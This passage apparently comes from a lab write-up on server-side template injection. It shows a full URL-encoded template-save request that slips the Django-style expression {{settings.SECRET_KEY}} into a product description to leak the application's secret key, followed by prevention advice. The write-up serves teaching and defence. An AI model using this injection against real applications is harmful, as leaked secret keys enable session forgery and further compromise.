- `&template=%3Cp%3EWe%27ve+all+been+there%2C+found+ourselves+in+a+situation+where+we+find+it+hard+to+look+interested+in+what+our+colleagues%2C+bosses%2C+friends%2C+and+family+are+saying.+With+our+smile+insert%2C+you+can+now+fake+it+like+a+pro.+Easy+to+use+and+completely+hypoallergenic+with+one+size+fits+all.%3C%2Fp%3E%0D%0A%3Cp%3EEver+glazed+over+as+your+pals+regale+you+with+tales+of+their+day+on+the+golf+course+with+the+boss%3F+This+is+the+product+for+you.+Not+only+will+you+appear+fully+engaged+and+happy+in+their+company%2C+but+you+will+also+be+the+object+of+everyone%27s+eye+as+they+fawn+over+your+bright%2C+white+Cheshire+Cat+Grin.%3C%2Fp%3E%0D%0A%3Cp%3ENo+need+to+spill+the+beans+on+this+one%2C+this+insert+is+available+by+invitation+only+and+is+protected+by+the+rules+of+the+magician%27s+code.+In+order+to+maintain+the+ruse+we+will+regularly+enhance+this+product+by+changing+the+size+and+shape+of+the+teeth%2C+but+always+guarantee+a+huge+smile+to+be+proud+of.%3C%2Fp%3E%0D%0A%3Cp%3EFor+those+of+you+unlucky+enough+to+have+lost+the+essential+front+smiling+teeth+we+can+make+smiles+to+order.+Grab+yourself+some+poster+putty%2C+bite+down+on+it+and+we%27ll+do+the+rest.+Say+%27yes%27+to+success+today+and+keep+those+crashing+bores+as+happy+as+you+look.%3C%2Fp%3E%0D%0A%3Cp%3EHurry%21+Only+%7B%7Bproduct.stock%7D%7D+left+of+%7B%7B+settings.SECRET_KEY+%7D%7D+at+%7B%7Bproduct.price%7D%7D.%3C%2Fp%3E&template-action=save`
- The payload we added is `{{settings.SECRET_KEY}}`

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Never build templates from user input. Pass user data to the template only as variables.
- If users must edit templates, use a logic-less engine or a properly sandboxed one, and treat the sandbox as a second line of defense.
- Do not expose sensitive objects, settings or secrets in the template context.
- Keep the template engine and its dependencies updated.
